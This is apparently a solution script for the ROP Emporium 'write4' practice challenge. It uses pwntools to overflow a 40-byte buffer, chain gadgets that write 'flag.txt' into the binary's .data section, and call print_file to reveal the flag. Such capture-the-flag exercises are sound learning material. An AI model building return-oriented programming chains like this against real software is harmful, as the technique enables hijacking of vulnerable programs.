from pwn import *

context.clear(arch='amd64')
context.terminal = ['urxvt', '-e']

binary = ELF('./write4')
p = process('./write4')

rop = ROP(binary)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
mov_r14_r15 = int('0x0000000000400628', 16) # mov [r14], r15; ret;
ret = rop.find_gadget(['ret'])[0]

data_start = binary.symbols['data_start']
print_file = binary.plt['print_file']

bof_len = 40

rop_chain = b'A' * bof_len

rop_chain += p64(pop_r14_r15) # pop r14; pop r15; ret;
rop_chain += p64(data_start) # .data
rop_chain += b'flag.txt' 

rop_chain += p64(mov_r14_r15) # mov [r14], r15; ret;

rop_chain += p64(pop_rdi) # pop rdi; ret;
rop_chain += p64(data_start)

rop_chain += p64(print_file) # print_file@plt

#gdb.attach(p, gdbscript="b *pwnme")

p.sendline(rop_chain)
p.interactive()

